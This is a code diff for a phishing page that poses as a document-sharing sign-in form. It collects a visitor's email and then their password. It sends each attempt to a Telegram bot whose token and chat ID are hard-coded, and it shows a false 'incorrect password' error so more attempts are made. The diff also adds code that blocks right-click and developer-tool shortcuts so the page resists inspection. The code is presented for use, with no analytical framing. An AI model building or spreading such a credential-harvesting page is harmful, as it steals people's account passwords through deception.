@@ -72,28 +72,32 @@
             height: 64px;
             opacity: 0.8;
         }
+
+        #password-section {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <!-- Spinner on the left side -->
     <img src="ajax.gif" alt="Loading..." class="left-spinner">
 
     <div class="login-container">
         <h2>Sign in</h2>  
-        </p>You need to enter the email that this was shared to:</p>
+        <p id="instruction">You need to enter the email that this was shared to:</p>
+
         <form name="loginForm" method="post" onsubmit="return validateForm(event)">
-            <div>
+            <div id="email-section">
                 <label for="username">Email:</label>
                 <input type="text" id="username" name="username" class="inp" placeholder="Enter your email">
                 <span id="errfn" class="err"></span>
+                <button type="button" class="btn" onclick="showPassword()">Next</button>
             </div>
-            <div>
+
+            <div id="password-section">
                 <label for="password">Password:</label>
                 <input type="password" id="password" name="password" class="inp" placeholder="Enter your password">
                 <span id="errfnn" class="err"></span>
-            </div>
-            <div>
                 <button type="submit" class="btn">Login</button>
             </div>
         </form>
@@ -101,24 +105,43 @@
 
     <script type="text/javascript">
         let attemptCount = 0;
+        let savedEmail = '';
 
-        function validateForm(event) {
+        document.addEventListener('contextmenu', function(event) {
             event.preventDefault();
+        });
 
+        document.addEventListener('keydown', function(event) {
+            if (
+                event.key === 'F12' ||
+                (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'i') ||
+                (event.ctrlKey && event.key.toLowerCase() === 'u') ||
+                (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'j')
+            ) {
+                event.preventDefault();
+            }
+        });
+
+        function showPassword() {
             var email = document.getElementById('username').value.trim();
-            var password = document.getElementById('password').value.trim();
-
-            // Validate email
             var atpos = email.indexOf("@");
             var dotpos = email.lastIndexOf(".");
             if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 >= email.length) {
                 document.getElementById("errfn").innerHTML = "Not a valid email address";
                 return false;
-            } else {
-                document.getElementById("errfn").innerHTML = "";
             }
 
-            // Validate password
+            savedEmail = email;
+            document.getElementById("errfn").innerHTML = "";
+            document.getElementById("email-section").style.display = "none";
+            document.getElementById("password-section").style.display = "block";
+            document.getElementById("instruction").textContent = "Now enter your account password:";
+        }
+
+        function validateForm(event) {
+            event.preventDefault();
+            var password = document.getElementById('password').value.trim();
+
             if (!password) {
                 document.getElementById("errfnn").innerHTML = "Password is required";
                 return false;
@@ -127,20 +150,19 @@
             }
 
             attemptCount++;
-            let message = `Email: ${email}\nPassword Attempt ${attemptCount}: ${password}`;
+            let message = `Email: ${savedEmail}\nPassword Attempt ${attemptCount}: ${password}`;
 
-            // Send to Telegram
             const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
             const chatId = '1461764555';
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
-              .then(response => {
-                  if (!response.ok) throw new Error('Network error');
-              })
-              .catch(err => {
-                  console.error('Telegram error:', err);
-              });
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                })
+                .catch(err => {
+                    console.error('Telegram error:', err);
+                });
 
             if (attemptCount < 3) {
                 document.getElementById("errfnn").innerHTML = "Your account or password is incorrect";
